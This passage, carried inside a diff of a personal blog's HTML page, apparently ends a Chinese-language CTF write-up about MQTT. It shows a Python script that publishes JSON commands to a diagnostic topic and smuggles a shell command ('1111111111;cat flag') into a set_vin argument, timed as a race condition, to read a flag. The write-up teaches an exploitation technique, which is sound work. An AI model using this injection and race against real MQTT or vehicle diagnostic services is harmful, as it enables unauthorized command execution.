+</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;public&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">connect_mqtt</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">on_connect</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">userdata</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="n">reasonCode</span><span class="p">,</span> <span class="n">properties</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">client</span><span class="o">.</span><span class="n">subscribe</span><span class="p">(</span><span class="s2">&#34;diag&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">client</span><span class="o">.</span><span class="n">subscribe</span><span class="p">(</span><span class="s2">&#34;diag/resp&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Connected with result code </span><span class="si">{</span><span class="n">reasonCode</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">on_message</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">userdata</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">message</span> <span class="o">=</span> <span class="n">msg</span><span class="o">.</span><span class="n">payload</span>  <span class="c1"># Decode message payload</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#print(message)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">msg</span><span class="o">.</span><span class="n">topic</span> <span class="o">==</span> <span class="s2">&#34;diag/resp&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[RECV] Message: </span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">msg</span><span class="o">.</span><span class="n">topic</span> <span class="o">==</span> <span class="s2">&#34;diag&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[SEND] Message: </span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">client</span> <span class="o">=</span> <span class="n">mqtt_client</span><span class="o">.</span><span class="n">Client</span><span class="p">(</span><span class="n">mqtt_client</span><span class="o">.</span><span class="n">CallbackAPIVersion</span><span class="o">.</span><span class="n">VERSION2</span><span class="p">,</span> <span class="n">client_id</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">username_pw_set</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">on_connect</span> <span class="o">=</span> <span class="n">on_connect</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">on_message</span> <span class="o">=</span> <span class="n">on_message</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">broker</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">keepalive</span><span class="o">=</span><span class="mi">10000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">client</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">publish</span><span class="p">(</span><span class="n">client</span><span class="p">,</span><span class="n">msg</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">publish</span><span class="p">(</span><span class="n">topic</span><span class="p">,</span> <span class="n">msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_message</span><span class="p">(</span><span class="n">auth</span><span class="p">:</span><span class="nb">str</span><span class="p">,</span> <span class="n">cho_cmd</span><span class="p">:</span><span class="nb">int</span><span class="p">,</span> <span class="n">arg</span><span class="p">:</span><span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">cho_cmd</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;get_version&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">cho_cmd</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">:</span><span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;set_vin&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;set_adb&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">message</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;auth&#34;</span><span class="p">:</span> <span class="n">auth</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;cmd&#34;</span><span class="p">:</span> <span class="n">cmd</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;arg&#34;</span><span class="p">:</span> <span class="n">arg</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">message</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">race_condition</span><span class="p">(</span><span class="n">client</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mes</span> <span class="o">=</span> <span class="n">send_message</span><span class="p">(</span><span class="s2">&#34;fb80056a&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s2">&#34;1111111111;cat flag&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">publish</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">mes</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span> <span class="o">=</span> <span class="n">connect_mqtt</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">loop_start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mes</span> <span class="o">=</span> <span class="n">send_message</span><span class="p">(</span><span class="s2">&#34;fb80056a&#34;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">publish</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">mes</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">#_ondes = _thread.start_new_thread( race_condition, (client,) )</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">mes</span> <span class="o">=</span> <span class="n">send_message</span><span class="p">(</span><span class="s2">&#34;fb80056a&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s2">&#34;1111111111&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">publish</span><span class="p">(</span><span class="n">client</span><span class="p">,</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">mes</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">race_condition</span><span class="p">(</span><span class="n">client</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#race_condition(client)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">loop_stop</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span><span class="o">.</span><span class="n">disconnect</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">run</span><span class="p">()</span>
+</span></span></code></pre></div><p><img src="../images/mqtt7.png" alt=""></p>
+<p>至此，感觉理解的差不多了。</p></article>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+</div>
+<script type="application/javascript" src='https://ret2ldz.github.io/js/toc.js'></script>
+<link rel="stylesheet" href='https://ret2ldz.github.io/css/toc.css' />
+
+  
+<div id="gitalk-container" class="gitalk-container"></div>
+<link rel="stylesheet" href='https://ret2ldz.github.io/css/gitalk.css'>
+<script src='https://ret2ldz.github.io/js/gitalk.min.js'></script>
+<script>
+  const gitalk = new Gitalk({
+    clientID: 'Your client ID',
+    clientSecret: 'Your client secret',
+    repo: 'ret2ldz.github.io',
+    owner: 'ventusoon',
+    admin: ['ventusoon'],
+    id: eval("location.pathname"), 
+    distractionFreeMode: false 
+  });
+  (function() {
+    gitalk.render('gitalk-container');
+  })();
+</script>
+
+</div>
+
+  <div class="footer container-xl width-full p-responsive">
+  <div
+    class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light ">
+    <a aria-label="Homepage" title="GitHub" class="footer-octicon d-none d-lg-block mr-lg-4" href="https://ret2ldz.github.io/">
+      <svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="24">
+        <path fill-rule="evenodd"
+          d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
+        </path>
+      </svg>
+    </a>
+    <ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
+      
+      <li class="mr-3 mr-lg-0">Theme by <a href='https://github.com/MeiK2333/github-style'>github-style</a></li>
+      
+      <li class="mr-3 mr-lg-0">GitHub and the Invertocat logo are trademarks of <a href="https://github.com/">GitHub, Inc.</a></li>
+    </ul>
+  </div>
+  <div class="d-flex flex-justify-center pb-6">
+    <span class="f6 text-gray-light"></span>
+  </div>
+
+
+</div>
+
+</body>
+
+<script type="application/javascript" src="https://ret2ldz.github.io/js/github-style.js"></script>
+
+
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/fuse.js/dist/fuse.min.js"></script>
+<script type="application/javascript" src='https://ret2ldz.github.io/js/search.js'></script>
+
+
+
+</html>
